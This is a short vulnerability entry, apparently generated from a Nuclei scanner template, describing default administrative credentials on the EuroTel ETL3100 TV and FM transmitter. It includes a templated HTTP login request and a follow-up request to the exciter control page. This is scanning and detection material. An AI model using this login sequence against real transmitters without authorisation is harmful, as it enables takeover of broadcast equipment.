# Vulnerability: EuroTel ETL3100 - Default Login
**Classification:** MISCONFIG
**Source:** Nuclei Template (`etl3100-default-login.yaml`)

## Description
The TV and FM transmitter uses a weak set of default administrative credentials that can be guessed in remote password attacks and gain full control of the system.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

txtUserId={{username}}&txtPassword={{password}}&btnLogin=Login

GET /exciter.php HTTP/1.1
Host: {{Hostname}}
```

